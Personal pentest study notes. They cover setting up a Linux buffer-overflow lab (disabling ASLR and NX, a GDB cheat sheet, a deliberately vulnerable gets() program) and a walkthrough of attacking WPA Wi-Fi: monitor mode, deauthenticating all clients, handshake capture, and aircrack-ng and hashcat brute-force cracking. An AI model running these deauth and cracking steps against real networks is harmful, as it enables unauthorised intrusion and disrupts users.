# Linux BOF & Wireless Attacks

#### Environment setup

1. install `edb`

```bash
sudo apt-get install edb
```

1. disable `ASLR` and `DEP` on linux

```bash
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
cat /proc/sys/kernel/randomize_va_space

sudo nano /etc/default/grub
# GRUB_CMDLINE_LINUX_DEFAULT="quiet splash noexec=off noexec32=off clearcpuid=514"
sudo update-grub
sudo reboot
```

1. `edb` is pretty much the same as `immunity debugger` you can do the same steps as we did on windows.

### GDB Basics Cheat Sheet

#### Starting and Quitting

* `gdb <program>`: Start GDB with a program.
* `run` or `r`: Start the program.
* `quit` or `q`: Exit GDB.

#### Breakpoints

* `break <location>` or `b <location>`: Set a breakpoint.
* `info breakpoints` or `i b`: List breakpoints.
* `delete <num>` or `d <num>`: Delete a breakpoint.

#### Stepping and Continuing

* `next` or `n`: Step to the next line (skip functions).
* `step` or `s`: Step into a function.
* `continue` or `c`: Continue execution.

#### Inspecting Variables and Memory

* `print <expr>` or `p <expr>`: Print value of an expression.
* `x/<format> <address>`: Examine memory (e.g., `x/4x` for 4 hex values).
* `info locals`: Show local variables.

#### Stack and Frames

* `backtrace` or `bt`: Show the call stack.
* `frame <num>` or `f <num>`: Switch to a frame.
* `info frame`: Show details of the current frame.

#### Running and Control

* `kill`: Stop program execution.
* `jump <location>`: Jump to a line or address.

#### Threads

* `info threads`: List threads.
* `thread <num>`: Switch to a thread.

### Exploit Vuln program

* protostar stack5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

* compile 32-bit program with no ASLR and no execution protection

```bash
gcc -m32 -no-pie -fno-stack-protector stack5.c -o stack5 
```

## Wireless

#### Config Adapter `TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]`

* check Adapter info

```bash
iwconfig
lsusb
```

* install required drivers

```bash
sudo apt install realtek-rtl8188eus-dkms -y
```

### start monitoring

* check the wireless adapter for monitor mode:

```bash
sudo airmon-ng check kill
```

* Start monitor mode on the wireless interface, this will change the interface name to `wlan0mon`

```bash
sudo airmon-ng start wlan0 
```

* Now let’s capture the wireless packets that fly around us on the air to know what wifi networks available.

```bash
sudo airodump-ng wlan0
```

**BSSID**: The MAC address (unique identifier) of the access point or router.

**ESSID**: The network name (SSID) broadcast by the access point.

**ENC**: The encryption protocol used (e.g., WEP, WPA, WPA2).

**Cipher**: The encryption algorithm used for securing the data (e.g., CCMP, TKIP).

**Auth**: The authentication method (e.g., PSK, MGT) used to verify devices connecting to the network.

**Channel**: The specific frequency band used on which the access point is operating.

Network power:

![WF\_S\_S\_4@2x.webp](https://prod-files-secure.s3.us-west-2.amazonaws.com/93d80e8d-76b2-4a09-9be6-3dad0f3c14ab/c9fa2488-6cf4-47ad-a4ab-98239b6fe555/WF\_S\_S\_42x.webp)

### Attacking target:

* Capturing the target traffic to/from clients to get authentication handshakes.

```bash
sudo airodump-ng –w captures -c <channel> –bssid <MAC Address> wlan0
```

* De-authenticate all clients to force them authenticate and then capture the authentication packets.

```bash
sudo aireplay-ng --deauth 0 -a <MAC Address of AP> wlan0
```

* No try to capture authentication handshakes again.

**Inspecting the captured traffic with `wireshark`**:

```bash
wireshark capture-01.cap
```

In Wireshark we want to filter with `eapol` to get the 4-way handshake for WiFi connections.

### Cracking Authentication keys

* Put the interface back to managed mode

```bash
sudo airmon-ng stop wlan0mon
```

* Cracking

```bash
sudo aircrack-ng <pcap-file> -w /usr/share/wordlists/rockyou.txt
```

#### Cracking with hashcat

Convert the cap file to hash with hashcat utils or using this web app: [https://hashcat.net/cap2hashcat/](https://hashcat.net/cap2hashcat/)

```bash
./cap2hccapx.bin input.pcap output.hccapx [filter by essid] [additional network essid:bssid]
```

1. **Brute Force Attack for 8 Digits**

```bash
hashcat -m 2500 -a 3 <OUTPUT_FILE>.hccapx ?d?d?d?d?d?d?d?d
```

1. **Brute Force Attack for 8 Characters (Digits and Alphabet)**

```bash
hashcat -m 2500 -a 3 <OUTPUT_FILE>.hccapx ?a?a?a?a?a?a?a?a
```

?a: Represents any alphanumeric character (lowercase, uppercase, digits, and symbols).

1. **brute force lower letters**

```bash
hashcat -m 2500 -a 3 <OUTPUT_FILE>.hccapx ?l?l?l?l?l?l?l?l
```

1. **Brute Force Attack for 8 to 11 Digits**

```bash
hashcat -m 2500 -a 3 <OUTPUT_FILE>.hccapx ?d?d?d?d?d?d?d?d --increment --increment-min=8 --increment-max=11
```
